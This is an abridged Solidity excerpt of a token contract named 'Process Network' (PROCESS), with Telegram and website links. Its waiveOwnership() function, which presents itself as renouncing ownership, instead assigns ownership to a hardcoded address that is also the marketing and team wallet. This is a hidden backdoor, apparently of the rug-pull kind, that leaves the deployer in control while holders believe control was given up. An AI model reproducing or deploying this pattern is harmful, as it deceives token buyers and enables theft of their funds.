...
/**
Telegram : https://t.me/processnetwork
Website : https://process.ga
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0xd43939F0D620Fa9e87FB9850a910447A386393C1);
    }
...
contract ProcessNetwork is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Process Network";
    string private _symbol = "PROCESS";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xd43939F0D620Fa9e87FB9850a910447A386393C1);
    address payable public teamWalletAddress = payable(0xd43939F0D620Fa9e87FB9850a910447A386393C1);
